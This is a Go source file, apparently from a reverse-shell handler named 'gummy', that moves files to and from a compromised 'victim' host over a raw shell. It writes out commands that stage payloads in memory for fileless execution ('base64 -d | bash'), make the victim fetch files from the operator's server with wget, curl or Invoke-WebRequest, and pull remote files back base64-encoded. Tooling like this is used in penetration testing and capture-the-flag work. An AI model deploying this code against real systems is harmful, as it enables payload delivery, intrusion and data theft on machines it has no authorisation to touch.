package internal

import (
	"context"
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/chsoares/gummy/internal/ui"
)

// Transferer handles file upload/download operations
type Transferer struct {
	conn        net.Conn
	sessionID   string
	platform    string       // "windows", "linux", or "unknown"
	progressFn  func(string) // Optional callback for progress updates (TUI mode)
	ptyUpgraded bool         // Use smaller chunks for PTY-upgraded shells
}

// TransferConfig holds transfer configuration
type TransferConfig struct {
	ChunkSize int // Size of each chunk in bytes
	Timeout   time.Duration
}

// DefaultTransferConfig returns default transfer configuration
func DefaultTransferConfig() TransferConfig {
	return TransferConfig{
		ChunkSize: 32768, // 32KB chunks (safe for most shells)
		Timeout:   30 * time.Second,
	}
}

// NewTransferer creates a new Transferer instance
func NewTransferer(conn net.Conn, sessionID string) *Transferer {
	return &Transferer{
		conn:      conn,
		sessionID: sessionID,
		platform:  "linux", // Default to linux for backwards compatibility
	}
}

// SetPlatform sets the detected platform
func (t *Transferer) SetPlatform(platform string) {
	t.platform = platform
}

// progress reports a progress update via callback (TUI) or spinner (CLI).
func (t *Transferer) progress(text string) {
	if t.progressFn != nil {
		t.progressFn(text)
	}
}

// done prints a final message via stdout (CLI only — TUI uses doneFn callback).
func (t *Transferer) done(text string) {
	if t.progressFn == nil {
		fmt.Println(text)
	}
}

// Upload sends a local file to the remote system
// localPath: path to local file
// remotePath: destination path on remote system (if empty, uses filename in remote cwd)
// Press ESC to cancel
func (t *Transferer) Upload(ctx context.Context, localPath, remotePath string) error {
	// Read local file
	data, err := os.ReadFile(localPath)
	if err != nil {
		return fmt.Errorf("failed to read local file: %w", err)
	}

	// If remotePath is empty, use just the filename (will go to remote cwd)
	if remotePath == "" {
		remotePath = filepath.Base(localPath)
	}

	fileSize := len(data)

	// Progress reporting: use callback (TUI) or spinner (CLI)
	var spinner *ui.Spinner
	if t.progressFn == nil {
		spinner = ui.NewSpinner()
		spinner.Start(fmt.Sprintf("Uploading %s... 0 B / %s (0%s)", filepath.Base(localPath), formatSize(fileSize), "%"))
		defer spinner.Stop()
	} else {
		t.progress(fmt.Sprintf("Uploading %s... 0 B / %s", filepath.Base(localPath), formatSize(fileSize)))
	}

	// Drain leftover data from previous shell interactions
	t.drainConnection()

	// Encode to base64
	encoded := base64.StdEncoding.EncodeToString(data)

	// Calculate MD5 checksum for verification
	hash := md5.Sum(data)
	checksum := hex.EncodeToString(hash[:])

	// Send file in chunks
	config := DefaultTransferConfig()

	// Chunk size: smaller for Windows and PTY-upgraded shells (PTY buffer limits)
	chunkSize := config.ChunkSize
	if t.platform == "windows" || t.ptyUpgraded {
		chunkSize = 1024 // 1KB chunks — safe for PTY buffers and Windows
	}
	chunks := splitIntoChunks(encoded, chunkSize)

	// Create temp file for base64 data
	if t.platform == "windows" {
		// Windows: Create empty .b64 file for base64 content
		escapedPath := strings.ReplaceAll(remotePath, "'", "''")
		setupCmd := fmt.Sprintf("Remove-Item '%s.b64' -Force -ErrorAction SilentlyContinue; New-Item '%s.b64' -ItemType File -Force | Out-Null\r\n", escapedPath, escapedPath)
		t.conn.Write([]byte(setupCmd))
		time.Sleep(150 * time.Millisecond)
		t.drainConnection()
	} else {
		// Linux: Create temp file
		setupCommands := []string{
			fmt.Sprintf("rm -f %s.b64 2>/dev/null", remotePath),
			fmt.Sprintf("touch %s.b64", remotePath),
		}
		for _, cmd := range setupCommands {
			t.conn.Write([]byte(cmd + "\n"))
			time.Sleep(50 * time.Millisecond)
		}
	}

	// Send chunks with progress updates
	bytesSent := 0

	for i, chunk := range chunks {
		// Check for cancellation
		select {
		case <-ctx.Done():
			return fmt.Errorf("upload cancelled by user")
		default:
		}

		// Append chunk (platform-specific)
		if t.platform == "windows" {
			// PowerShell: Append to .b64 file using Out-File with -Append -NoNewline
			// This avoids PowerShell variable size limits and special character issues
			escapedChunk := strings.ReplaceAll(chunk, "'", "''")
			escapedPath := strings.ReplaceAll(remotePath, "'", "''")
			cmd := fmt.Sprintf("'%s' | Out-File -FilePath '%s.b64' -Append -NoNewline -Encoding ASCII\r\n", escapedChunk, escapedPath)
			_, err := t.conn.Write([]byte(cmd))
			if err != nil {
				return fmt.Errorf("connection lost during upload: %w", err)
			}
		} else {
			// Linux/Unix: printf to temp file (more reliable than echo)
			cmd := fmt.Sprintf("printf '%%s' '%s' >> %s.b64\n", chunk, remotePath)
			_, err := t.conn.Write([]byte(cmd))
			if err != nil {
				return fmt.Errorf("connection lost during upload: %w", err)
			}
		}

		// Small sleep to avoid overwhelming the shell
		if t.platform == "windows" || t.ptyUpgraded {
			time.Sleep(15 * time.Millisecond) // 1KB every 15ms = ~67KB/s (safe for PTY/Windows)
		} else {
			time.Sleep(5 * time.Millisecond) // 32KB every 5ms = ~6.4MB/s (raw shell)
		}

		bytesSent += len(chunk)

		// Calculate actual file progress (not base64 size)
		actualBytes := int(float64(bytesSent) / 1.37)
		if actualBytes > fileSize {
			actualBytes = fileSize
		}
		percent := int(float64(actualBytes) / float64(fileSize) * 100)

		// Update progress every 50 chunks or on last chunk
		if i%50 == 0 || i == len(chunks)-1 {
			msg := fmt.Sprintf("Uploading %s... %s / %s (%d%s)",
				filepath.Base(localPath), formatSize(actualBytes), formatSize(fileSize), percent, "%")
			if spinner != nil {
				spinner.Update(msg)
			} else {
				t.progress(msg)
			}
		}

		// Drain buffer to prevent overflow
		if t.platform == "windows" || t.ptyUpgraded {
			if i%10 == 0 && i > 0 {
				time.Sleep(150 * time.Millisecond)
				t.drainConnection()
			}
		} else {
			if i%25 == 0 && i > 0 {
				time.Sleep(100 * time.Millisecond)
				t.drainConnection()
			}
		}
	}

	// Decode base64 and save final file (platform-specific)
	var decodeCmd string
	if t.platform == "windows" {
		// PowerShell: Read base64 from file, decode to bytes, write to final file, cleanup
		escapedPath := strings.ReplaceAll(remotePath, "'", "''")
		decodeCmd = fmt.Sprintf("$b64 = Get-Content '%s.b64' -Raw; [IO.File]::WriteAllBytes((Resolve-Path '.').Path+'\\%s', [Convert]::FromBase64String($b64)); Remove-Item '%s.b64' -Force\r\n", escapedPath, escapedPath, escapedPath)
	} else {
		// Linux/Unix: Decode from temp file
		decodeCmd = fmt.Sprintf("base64 -d %s.b64 > %s && rm %s.b64\n", remotePath, remotePath, remotePath)
	}
	t.conn.Write([]byte(decodeCmd))
	time.Sleep(300 * time.Millisecond)

	// Drain output from all commands
	t.drainConnection()

	// Verify checksum with markers (platform-specific)
	marker := "GUMMY_MD5_START"
	endMarker := "GUMMY_MD5_END"
	var checksumCmd string
	if t.platform == "windows" {
		checksumCmd = fmt.Sprintf("echo %s; (Get-FileHash '%s' -Algorithm MD5).Hash.ToLower(); echo %s", marker, remotePath, endMarker)
	} else {
		checksumCmd = fmt.Sprintf("echo %s; md5sum %s 2>/dev/null | awk '{print $1}'; echo %s", marker, remotePath, endMarker)
	}
	t.conn.Write([]byte(checksumCmd + "\r\n"))
	time.Sleep(300 * time.Millisecond)

	// Read MD5 response
	var output strings.Builder
	buffer := make([]byte, 2048)
	t.conn.SetReadDeadline(time.Now().Add(2 * time.Second))

	for {
		n, err := t.conn.Read(buffer)
		if err != nil {
			break
		}
		if n > 0 {
			output.WriteString(string(buffer[:n]))
			if strings.Contains(output.String(), endMarker) {
				break
			}
		}
	}

	t.conn.SetReadDeadline(time.Time{})

	// Extract MD5
	fullOutput := output.String()
	startIdx := strings.LastIndex(fullOutput, marker)
	if startIdx != -1 {
		endIdx := strings.Index(fullOutput[startIdx:], endMarker)
		if endIdx != -1 {
			content := fullOutput[startIdx+len(marker):startIdx+endIdx]
			lines := strings.Split(content, "\n")
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if len(line) == 32 && isHex(line) {
					if line == checksum {
						if spinner != nil {
							spinner.Stop()
						}
						t.done(ui.Success(fmt.Sprintf("Upload complete! (MD5: %s)", checksum[:8])))
						return nil
					}
				}
			}
		}
	}

	// Fallback if MD5 check failed
	if spinner != nil {
		spinner.Stop()
	}
	t.done(ui.Success("Upload complete!"))
	return nil
}

// UploadToVariable sends file content to a bash variable (in-memory, no disk write on victim)
// localPath: path to local file
// varName: bash variable name to store content (e.g., "_gummy_script")
// Returns the variable name for later use (e.g., echo "$varName" | base64 -d | bash)
// UploadToBashVariable uploads a file to a bash variable (in-memory, no disk write on victim)
// The variable contains base64-encoded data for later execution
func (t *Transferer) UploadToBashVariable(ctx context.Context, localPath, varName string) error {
	// Read local file
	data, err := os.ReadFile(localPath)
	if err != nil {
		return fmt.Errorf("failed to read local file: %w", err)
	}

	fileSize := len(data)

	// Start spinner
	spinner := ui.NewSpinner()
	spinner.Start(fmt.Sprintf("Loading %s to memory... 0 B / %s (0%s)", filepath.Base(localPath), formatSize(fileSize), "%"))
	defer spinner.Stop()

	// Drain leftover data
	t.drainConnection()

	// Encode to base64
	encoded := base64.StdEncoding.EncodeToString(data)

	// Initialize empty variable
	initCmd := fmt.Sprintf("%s=''\n", varName)
	t.conn.Write([]byte(initCmd))
	time.Sleep(50 * time.Millisecond)

	// Send file in chunks, concatenating to variable
	config := DefaultTransferConfig()
	chunks := splitIntoChunks(encoded, config.ChunkSize)

	bytesSent := 0

	for i, chunk := range chunks {
		// Check for cancellation
		select {
		case <-ctx.Done():
			// Cleanup variable on cancel
			t.conn.Write([]byte(fmt.Sprintf("unset %s\n", varName)))
			return fmt.Errorf("upload cancelled by user")
		default:
		}

		// Append chunk to variable (using += operator)
		// Note: We keep it base64-encoded in the variable for now
		cmd := fmt.Sprintf("%s+='%s'\n", varName, chunk)
		_, err := t.conn.Write([]byte(cmd))
		if err != nil {
			return fmt.Errorf("connection lost during upload: %w", err)
		}

		time.Sleep(50 * time.Millisecond)

		bytesSent += len(chunk)

		// Calculate actual file progress
		actualBytes := int(float64(bytesSent) / 1.37)
		if actualBytes > fileSize {
			actualBytes = fileSize
		}
		percent := int(float64(actualBytes) / float64(fileSize) * 100)

		// Update spinner every 50 chunks or on last chunk
		if i%50 == 0 || i == len(chunks)-1 {
			spinner.Update(fmt.Sprintf("Loading %s to memory... %s / %s (%d%s)",
				filepath.Base(localPath), formatSize(actualBytes), formatSize(fileSize), percent, "%"))
		}

		// Drain buffer every 25 chunks
		if i%25 == 0 && i > 0 {
			time.Sleep(100 * time.Millisecond)
			t.drainConnection()
		}
	}

	// Variable is now loaded with base64-encoded content
	// No need to decode here - will be decoded during execution

	spinner.Stop()
	fmt.Println(ui.Success(fmt.Sprintf("Loaded %s into memory (%s)", filepath.Base(localPath), formatSize(fileSize))))

	t.drainConnection()
	return nil
}

// UploadToPowerShellVariable uploads a file to a PowerShell variable (in-memory, no disk write on victim)
func (t *Transferer) UploadToPowerShellVariable(ctx context.Context, localPath, varName string) error {
	// Read local file
	data, err := os.ReadFile(localPath)
	if err != nil {
		return fmt.Errorf("failed to read local file: %w", err)
	}

	fileSize := len(data)

	// Start spinner
	spinner := ui.NewSpinner()
	spinner.Start(fmt.Sprintf("Loading %s to memory... 0 B / %s (0%s)", filepath.Base(localPath), formatSize(fileSize), "%"))
	defer spinner.Stop()

	// Drain leftover data
	t.drainConnection()

	// Encode to base64
	encoded := base64.StdEncoding.EncodeToString(data)

	// Initialize empty variable (PowerShell syntax)
	initCmd := fmt.Sprintf("$%s = ''\r\n", varName)
	t.conn.Write([]byte(initCmd))
	time.Sleep(100 * time.Millisecond)

	// Use small chunk size (1KB) to avoid quote escaping issues
	const psChunkSize = 1024
	chunks := splitIntoChunks(encoded, psChunkSize)

	bytesSent := 0

	for i, chunk := range chunks {
		// Check for cancellation
		select {
		case <-ctx.Done():
			// Cleanup variable on cancel
			t.conn.Write([]byte(fmt.Sprintf("Remove-Variable -Name %s\r\n", varName)))
			return fmt.Errorf("upload cancelled by user")
		default:
		}

		// Append chunk to variable (PowerShell += operator)
		// Escape single quotes by doubling them
		escapedChunk := strings.ReplaceAll(chunk, "'", "''")
		cmd := fmt.Sprintf("$%s += '%s'\r\n", varName, escapedChunk)
		_, err := t.conn.Write([]byte(cmd))
		if err != nil {
			return fmt.Errorf("connection lost during upload: %w", err)
		}

		time.Sleep(15 * time.Millisecond) // Optimized for speed while maintaining stability

		bytesSent += len(chunk)

		// Calculate actual file progress
		actualBytes := int(float64(bytesSent) / 1.37)
		if actualBytes > fileSize {
			actualBytes = fileSize
		}
		percent := int(float64(actualBytes) / float64(fileSize) * 100)

		// Update spinner every 20 chunks or on last chunk
		if i%20 == 0 || i == len(chunks)-1 {
			spinner.Update(fmt.Sprintf("Loading %s to memory... %s / %s (%d%s)",
				filepath.Base(localPath), formatSize(actualBytes), formatSize(fileSize), percent, "%"))
		}

		// Drain buffer every 10 chunks (more frequent for PowerShell)
		if i%10 == 0 && i > 0 {
			time.Sleep(150 * time.Millisecond)
			t.drainConnection()
		}
	}

	spinner.Stop()
	fmt.Println(ui.Success(fmt.Sprintf("Loaded %s into memory (%s)", filepath.Base(localPath), formatSize(fileSize))))

	t.drainConnection()
	return nil
}

// UploadToPythonVariable uploads a file to a Python variable (in-memory, no disk write on victim)
func (t *Transferer) UploadToPythonVariable(ctx context.Context, localPath, varName string) error {
	// Read local file
	data, err := os.ReadFile(localPath)
	if err != nil {
		return fmt.Errorf("failed to read local file: %w", err)
	}

	fileSize := len(data)

	// Start spinner
	spinner := ui.NewSpinner()
	spinner.Start(fmt.Sprintf("Loading %s to memory... 0 B / %s (0%s)", filepath.Base(localPath), formatSize(fileSize), "%"))
	defer spinner.Stop()

	// Drain leftover data
	t.drainConnection()

	// Encode to base64
	encoded := base64.StdEncoding.EncodeToString(data)

	// Initialize empty variable (Python syntax)
	initCmd := fmt.Sprintf("%s = ''\n", varName)
	t.conn.Write([]byte(initCmd))
	time.Sleep(50 * time.Millisecond)

	// Use small chunk size (1KB) to avoid quote escaping issues
	const pyChunkSize = 1024
	chunks := splitIntoChunks(encoded, pyChunkSize)

	bytesSent := 0

	for i, chunk := range chunks {
		// Check for cancellation
		select {
		case <-ctx.Done():
			// Cleanup variable on cancel
			t.conn.Write([]byte(fmt.Sprintf("del %s\n", varName)))
			return fmt.Errorf("upload cancelled by user")
		default:
		}

		// Append chunk to variable (Python += operator)
		// Escape single quotes for Python strings
		escapedChunk := strings.ReplaceAll(chunk, "'", "\\'")
		cmd := fmt.Sprintf("%s += '%s'\n", varName, escapedChunk)
		_, err := t.conn.Write([]byte(cmd))
		if err != nil {
			return fmt.Errorf("connection lost during upload: %w", err)
		}

		time.Sleep(15 * time.Millisecond)

		bytesSent += len(chunk)

		// Calculate actual file progress
		actualBytes := int(float64(bytesSent) / 1.37)
		if actualBytes > fileSize {
			actualBytes = fileSize
		}
		percent := int(float64(actualBytes) / float64(fileSize) * 100)

		// Update spinner every 50 chunks or on last chunk
		if i%50 == 0 || i == len(chunks)-1 {
			spinner.Update(fmt.Sprintf("Loading %s to memory... %s / %s (%d%s)",
				filepath.Base(localPath), formatSize(actualBytes), formatSize(fileSize), percent, "%"))
		}

		// Drain buffer every 25 chunks
		if i%25 == 0 && i > 0 {
			time.Sleep(100 * time.Millisecond)
			t.drainConnection()
		}
	}

	spinner.Stop()
	fmt.Println(ui.Success(fmt.Sprintf("Loaded %s into memory (%s)", filepath.Base(localPath), formatSize(fileSize))))

	t.drainConnection()
	return nil
}

// Download retrieves a file from the remote system
// remotePath: path to remote file
// localPath: destination path on local system (if empty, saves to current directory)
// Press ESC to cancel
func (t *Transferer) Download(ctx context.Context, remotePath, localPath string) error {
	// If localPath is empty, save to current directory with same filename
	if localPath == "" {
		localPath = filepath.Base(remotePath)
	}

	// Progress reporting: use callback (TUI) or spinner (CLI)
	var spinner *ui.Spinner
	if t.progressFn == nil {
		spinner = ui.NewSpinner()
		spinner.Start(fmt.Sprintf("Downloading %s... 0 B", filepath.Base(remotePath)))
		defer spinner.Stop()
	} else {
		t.progress(fmt.Sprintf("Downloading %s...", filepath.Base(remotePath)))
	}

	// Drain leftover data from previous shell interactions
	t.drainConnection()

	// Use unique markers
	marker := "GUMMY_B64_START"
	endMarker := "GUMMY_B64_END"

	// Send command with markers (platform-specific)
	var cmd string
	if t.platform == "windows" {
		// PowerShell: Read file as bytes, convert to base64
		// Use Resolve-Path to get absolute path
		cmd = fmt.Sprintf("echo %s; [Convert]::ToBase64String([IO.File]::ReadAllBytes((Resolve-Path '%s').Path)); echo %s\r\n", marker, remotePath, endMarker)
	} else {
		// Linux/Unix
		cmd = fmt.Sprintf("echo %s; base64 -w 0 %s 2>/dev/null; echo; echo %s\n", marker, remotePath, endMarker)
	}
	t.conn.Write([]byte(cmd))

	time.Sleep(500 * time.Millisecond)

	// Read output with progress indication
	var output strings.Builder
	buffer := make([]byte, 8192)
	totalBytes := 0
	lastProgressUpdate := 0

	for {
		// Check for cancellation
		select {
		case <-ctx.Done():
			return fmt.Errorf("download cancelled by user")
		default:
		}

		// Reset deadline on each read
		t.conn.SetReadDeadline(time.Now().Add(10 * time.Second))

		n, err := t.conn.Read(buffer)
		if err != nil {
			// Timeout - break and check what we have
			break
		}

		if n > 0 {
			output.WriteString(string(buffer[:n]))
			totalBytes += n

			// Update progress every 100KB to avoid spam
			if totalBytes-lastProgressUpdate >= 100*1024 {
				msg := fmt.Sprintf("Downloading %s... %s", filepath.Base(remotePath), formatSize(totalBytes))
				if spinner != nil {
					spinner.Update(msg)
				} else {
					t.progress(msg)
				}
				lastProgressUpdate = totalBytes
			}

			// Check if we have complete data: end marker AFTER last start marker
			currentOutput := output.String()
			lastStartIdx := strings.LastIndex(currentOutput, marker)
			if lastStartIdx != -1 {
				remainingAfterStart := currentOutput[lastStartIdx:]
				if strings.Contains(remainingAfterStart, endMarker) {
					break
				}
			}
		}
	}

	t.conn.SetReadDeadline(time.Time{})

	fullOutput := output.String()

	// Find markers (use LastIndex to skip command echo)
	startIdx := strings.LastIndex(fullOutput, marker)
	if startIdx == -1 {
		return fmt.Errorf("file not found: %s", remotePath)
	}

	endIdx := strings.Index(fullOutput[startIdx:], endMarker)
	if endIdx == -1 {
		return fmt.Errorf("incomplete download")
	}
	endIdx += startIdx

	// Extract base64 content
	content := fullOutput[startIdx+len(marker):endIdx]

	// Clean and join base64 lines
	lines := strings.Split(content, "\n")
	var base64Lines []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if len(line) > 0 {
			base64Lines = append(base64Lines, line)
		}
	}

	if len(base64Lines) == 0 {
		return fmt.Errorf("file is empty: %s", remotePath)
	}

	base64Data := strings.Join(base64Lines, "")

	// Decode
	decoded, err := base64.StdEncoding.DecodeString(base64Data)
	if err != nil {
		return fmt.Errorf("failed to decode: %w", err)
	}

	// Save
	if err := os.WriteFile(localPath, decoded, 0644); err != nil {
		return fmt.Errorf("failed to write: %w", err)
	}

	// Checksum
	hash := md5.Sum(decoded)
	checksum := hex.EncodeToString(hash[:])

	if spinner != nil {
		spinner.Stop()
	}
	t.done(ui.Success(fmt.Sprintf("Download complete! Saved to: %s (%s, MD5: %s)",
		localPath, formatSize(len(decoded)), checksum[:8])))

	return nil
}

// drainConnection drains any pending data from connection
// This is CRITICAL before file transfer to remove leftover shell output
func (t *Transferer) drainConnection() {
	buffer := make([]byte, 4096)
	// Short timeout to avoid capturing user input after transfer completes
	t.conn.SetReadDeadline(time.Now().Add(50 * time.Millisecond))

	for {
		_, err := t.conn.Read(buffer)
		if err != nil {
			break // Timeout means buffer is clean
		}
	}

	t.conn.SetReadDeadline(time.Time{})
}

// isBase64Like checks if a string looks like base64 data
func isBase64Like(s string) bool {
	if len(s) < 10 {
		return false
	}
	// Base64 only contains: A-Z, a-z, 0-9, +, /, =
	for _, ch := range s {
		if !((ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z') ||
			(ch >= '0' && ch <= '9') || ch == '+' || ch == '/' || ch == '=') {
			return false
		}
	}
	return true
}

// splitIntoChunks splits a string into chunks of specified size
func splitIntoChunks(s string, chunkSize int) []string {
	var chunks []string
	for i := 0; i < len(s); i += chunkSize {
		end := i + chunkSize
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}

// formatSize formats bytes into human-readable size
func formatSize(bytes int) string {
	const unit = 1024
	if bytes < unit {
		return fmt.Sprintf("%d B", bytes)
	}

	units := []string{"KB", "MB", "GB", "TB", "PB", "EB"}
	div, exp := int64(unit), 0
	for n := bytes / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}

	return fmt.Sprintf("%.1f %s", float64(bytes)/float64(div), units[exp])
}

// isHex checks if string is valid hexadecimal
func isHex(s string) bool {
	_, err := hex.DecodeString(s)
	return err == nil
}

// DrainOutput drains any pending output from connection
func (t *Transferer) DrainOutput() {
	buffer := make([]byte, 4096)
	t.conn.SetReadDeadline(time.Now().Add(200 * time.Millisecond))

	for {
		_, err := t.conn.Read(buffer)
		if err != nil {
			break
		}
	}

	t.conn.SetReadDeadline(time.Time{})
}

// min returns the minimum of two integers
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// WatchForCancel watches for Ctrl+D (EOF) and cancels context
// Ctrl+D is detected by reading from stdin, doesn't conflict with readline or signals
func WatchForCancel(ctx context.Context, cancel context.CancelFunc) {
	// Read from stdin in a goroutine
	go func() {
		buf := make([]byte, 1)

		// Ensure stdin deadline is always cleared when this goroutine exits
		defer os.Stdin.SetReadDeadline(time.Time{})

		for {
			// Check context BEFORE attempting any read to avoid consuming input
			// after the transfer has completed
			select {
			case <-ctx.Done():
				return
			default:
			}

			// Use a short deadline so we can re-check context frequently
			os.Stdin.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
			n, err := os.Stdin.Read(buf)

			// Re-check context AFTER read - if cancelled during the read,
			// discard whatever we got and exit cleanly
			select {
			case <-ctx.Done():
				return
			default:
			}

			if err == io.EOF || (n == 0 && err == nil) {
				// Ctrl+D pressed (EOF) - cancel without printing newline
				cancel()
				return
			}
			// Ignore other input and timeout errors (timeout is expected)
		}
	}()
}

// SmartUpload intelligently uploads a file using HTTP (if binbag enabled) or b64 chunks as fallback
// source: Can be a URL, local file path, or binbag filename
// remotePath: destination path on remote system
// Returns: error if both methods fail
func (t *Transferer) SmartUpload(ctx context.Context, source, remotePath string) error {
	// Step 1: Resolve source to local file path
	localPath, cleanup, err := t.resolveSource(source)
	if err != nil {
		return fmt.Errorf("failed to resolve source: %w", err)
	}
	if cleanup != nil {
		defer cleanup() // Cleanup temp files on exit
	}

	// Step 2: Try HTTP upload if binbag is enabled
	if GlobalRuntimeConfig.BinbagEnabled {
		if err := t.uploadViaHTTP(ctx, localPath, remotePath); err == nil {
			return nil // Success via HTTP!
		}
		// HTTP failed, fallback to chunks
		t.done(ui.Warning("HTTP upload failed, falling back to base64 chunks..."))
	}

	// Step 3: Fallback to b64 chunks (always works)
	return t.Upload(ctx, localPath, remotePath)
}

// resolveSource resolves a source (URL/binbag/local) to a local file path
// Returns: (localPath, cleanupFunc, error)
// cleanupFunc should be called to remove temporary files (can be nil)
func (t *Transferer) resolveSource(source string) (string, func(), error) {
	// Case 1: URL - download to binbag (if enabled) or /tmp
	if strings.HasPrefix(source, "http://") || strings.HasPrefix(source, "https://") {
		filename := filepath.Base(source)

		var tmpPath string
		if GlobalRuntimeConfig != nil && GlobalRuntimeConfig.BinbagEnabled {
			// Binbag enabled: download to binbag dir so HTTP server can serve it
			tmpPath = filepath.Join(GlobalRuntimeConfig.BinbagPath, "tmp_"+filename)
		} else {
			// Binbag disabled: download to /tmp for local use
			tmpPath = filepath.Join("/tmp", "gummy_"+filename)
		}

		// Download file
		if err := DownloadFile(context.Background(), source, tmpPath); err != nil {
			return "", nil, fmt.Errorf("failed to download URL: %w", err)
		}

		cleanup := func() {
			os.Remove(tmpPath) // Cleanup tmp file
		}

		return tmpPath, cleanup, nil
	}

	// Case 2: Check binbag first (if enabled)
	if GlobalRuntimeConfig.BinbagEnabled {
		binbagFile := filepath.Join(GlobalRuntimeConfig.BinbagPath, source)
		if _, statErr := os.Stat(binbagFile); statErr == nil {
			return binbagFile, nil, nil // File exists in binbag!
		} else {
		}
	}

	// Case 3: Local file path
	if _, err := os.Stat(source); err == nil {
		// If binbag enabled, copy to binbag as tmp_*
		if GlobalRuntimeConfig.BinbagEnabled {
			filename := filepath.Base(source)
			tmpPath := filepath.Join(GlobalRuntimeConfig.BinbagPath, "tmp_"+filename)

			// Copy file to binbag
			data, err := os.ReadFile(source)
			if err != nil {
				return "", nil, fmt.Errorf("failed to read local file: %w", err)
			}
			if err := os.WriteFile(tmpPath, data, 0644); err != nil {
				return "", nil, fmt.Errorf("failed to copy to binbag: %w", err)
			}

			cleanup := func() {
				os.Remove(tmpPath) // Cleanup tmp file
			}

			return tmpPath, cleanup, nil
		}

		// Binbag disabled, use file directly
		return source, nil, nil
	}

	return "", nil, fmt.Errorf("file not found: %s", source)
}

// uploadViaHTTP uploads a file using HTTP server (victim downloads via wget/curl)
func (t *Transferer) uploadViaHTTP(ctx context.Context, localPath, remotePath string) error {
	// Verify file exists locally (must be in binbag or already resolved)
	if _, err := os.Stat(localPath); os.IsNotExist(err) {
		return fmt.Errorf("file not found locally: %s", localPath)
	}

	filename := filepath.Base(localPath)

	// If remotePath is empty, use filename in current directory
	if remotePath == "" {
		remotePath = filename
	}

	// Get HTTP URL (with pivot if configured)
	url := GlobalRuntimeConfig.GetHTTPURL(filename)

	// Platform-specific download command
	var downloadCmd string
	if t.platform == "windows" {
		// PowerShell: Invoke-WebRequest (wget alias)
		downloadCmd = fmt.Sprintf("Invoke-WebRequest -Uri '%s' -OutFile '%s'\r\n", url, remotePath)
	} else {
		// Linux: wget or curl
		downloadCmd = fmt.Sprintf("wget -q '%s' -O '%s' || curl -s '%s' -o '%s'\r\n", url, remotePath, url, remotePath)
	}

	// Get file size for progress display
	fileInfo, _ := os.Stat(localPath)
	fileSize := fileInfo.Size()

	// Progress reporting
	var spinner *ui.Spinner
	if t.progressFn == nil {
		spinner = ui.NewSpinner()
		spinner.Start(fmt.Sprintf("Uploading %s via HTTP... 0 B / %s", filepath.Base(localPath), formatSize(int(fileSize))))
		defer spinner.Stop()
	} else {
		t.progress(fmt.Sprintf("Uploading %s via HTTP...", filepath.Base(localPath)))
	}

	// Send download command
	if _, err := t.conn.Write([]byte(downloadCmd)); err != nil {
		return fmt.Errorf("failed to send download command: %w", err)
	}

	// Wait for HTTP server to complete the transfer (10 seconds inactivity timeout)
	if GlobalRuntimeConfig.FileServer != nil {
		success := GlobalRuntimeConfig.FileServer.WaitForTransfer(filename, 10*time.Second, func(progress TransferProgress) {
			if !progress.Done {
				percent := int(float64(progress.BytesTransferred) / float64(progress.TotalBytes) * 100)
				msg := fmt.Sprintf("Uploading %s via HTTP... %s / %s (%d%%)",
					filepath.Base(localPath),
					formatSize(int(progress.BytesTransferred)),
					formatSize(int(progress.TotalBytes)),
					percent)
				if spinner != nil {
					spinner.Update(msg)
				} else {
					t.progress(msg)
				}
			}
		})
		if spinner != nil {
			spinner.Stop()
		}
		if !success {
			return fmt.Errorf("HTTP transfer timeout or failed")
		}
		t.done(ui.Success(fmt.Sprintf("Upload complete! (%s via HTTP)", formatSize(int(fileSize)))))
		return nil
	}

	return fmt.Errorf("file server not available")
}
